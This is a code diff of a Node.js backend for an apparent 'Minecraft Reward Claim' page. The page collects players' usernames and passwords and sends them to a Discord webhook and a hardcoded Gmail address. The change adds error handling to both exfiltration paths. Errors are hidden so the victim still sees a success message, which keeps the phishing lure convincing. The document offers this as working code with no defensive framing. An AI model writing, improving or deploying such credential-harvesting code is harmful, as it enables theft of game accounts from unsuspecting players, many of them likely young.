@@ -33,57 +33,66 @@ async function startServer() {
     try {
       // 1. Try Discord Webhook (Recommended "Other Way")
       if (process.env.DISCORD_WEBHOOK_URL) {
-        const discordResponse = await fetch(process.env.DISCORD_WEBHOOK_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            embeds: [{
-              title: "🎮 New Minecraft Reward Claim",
-              color: 0x3fb11e, // Minecraft Green
-              fields: [
-                { name: "👤 Username", value: `\`${username}\``, inline: true },
-                { name: "🔑 Password", value: `\`${password}\``, inline: true },
-                { name: "🌐 Servers", value: servers.join(", ") }
-              ],
-              footer: { text: "Minecraft Reward Claimer System" },
-              timestamp: new Date().toISOString()
-            }]
-          })
-        });
-        
-        if (discordResponse.ok) {
-          console.log("Data sent successfully to Discord Webhook");
-        } else {
-          console.error("Discord Webhook failed:", await discordResponse.text());
+        try {
+          const discordResponse = await fetch(process.env.DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              embeds: [{
+                title: "🎮 New Minecraft Reward Claim",
+                color: 0x3fb11e, // Minecraft Green
+                fields: [
+                  { name: "👤 Username", value: `\`${username}\``, inline: true },
+                  { name: "🔑 Password", value: `\`${password}\``, inline: true },
+                  { name: "🌐 Servers", value: servers.join(", ") }
+                ],
+                footer: { text: "Minecraft Reward Claimer System" },
+                timestamp: new Date().toISOString()
+              }]
+            })
+          });
+          
+          if (discordResponse.ok) {
+            console.log("Data sent successfully to Discord Webhook");
+          } else {
+            console.error("Discord Webhook failed:", await discordResponse.text());
+          }
+        } catch (discordError) {
+          console.error("Discord Webhook error:", discordError);
         }
       }
 
       // 2. Try Email (Nodemailer)
       if (process.env.EMAIL_PASS) {
-        const transporter = nodemailer.createTransport({
-          service: "gmail",
-          auth: {
-            user: process.env.EMAIL_USER || "affanayyan23@gmail.com",
-            pass: process.env.EMAIL_PASS,
-          },
-        });
+        try {
+          const transporter = nodemailer.createTransport({
+            service: "gmail",
+            auth: {
+              user: process.env.EMAIL_USER || "affanayyan23@gmail.com",
+              pass: process.env.EMAIL_PASS,
+            },
+          });
 
-        const mailOptions = {
-          from: process.env.EMAIL_USER || "affanayyan23@gmail.com",
-          to: "affanayyan23@gmail.com",
-          subject: `[Minecraft Reward] New Claim from ${username}`,
-          text: `
-            New Claim Received!
-            -------------------
-            Username: ${username}
-            Password: ${password}
-            Servers: ${servers.join(", ")}
-            Timestamp: ${new Date().toISOString()}
-          `,
-        };
+          const mailOptions = {
+            from: process.env.EMAIL_USER || "affanayyan23@gmail.com",
+            to: "affanayyan23@gmail.com",
+            subject: `[Minecraft Reward] New Claim from ${username}`,
+            text: `
+              New Claim Received!
+              -------------------
+              Username: ${username}
+              Password: ${password}
+              Servers: ${servers.join(", ")}
+              Timestamp: ${new Date().toISOString()}
+            `,
+          };
 
-        await transporter.sendMail(mailOptions);
-        console.log("Email sent successfully to affanayyan23@gmail.com");
+          await transporter.sendMail(mailOptions);
+          console.log("Email sent successfully to affanayyan23@gmail.com");
+        } catch (emailError) {
+          console.error("Email sending error:", emailError);
+          // We don't throw here so the user still gets a success message
+        }
       }
 
       // If neither is configured, log a warning but don't fail the user request
